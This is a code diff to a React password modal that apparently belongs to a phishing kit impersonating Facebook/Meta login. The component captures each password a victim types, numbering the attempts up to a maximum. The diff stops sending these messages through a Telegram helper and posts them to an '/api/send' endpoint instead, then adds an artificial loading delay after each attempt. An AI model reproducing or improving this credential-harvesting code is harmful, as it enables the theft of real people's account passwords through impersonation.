@@ -2,11 +2,11 @@ import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import sendMessage from '@/utils/telegram';
 import translateText from '@/utils/translate';
 import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
 import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
+import axios from 'axios';
 import Image from 'next/image';
 import { type FC, useEffect, useState } from 'react';
 
@@ -58,7 +58,10 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         const message = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
         try {
-            await sendMessage(message, messageId ?? undefined);
+            await axios.post('/api/send', {
+                message,
+                message_id: messageId
+            });
             if (config.PASSWORD_LOADING_TIME) {
                 await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
             }
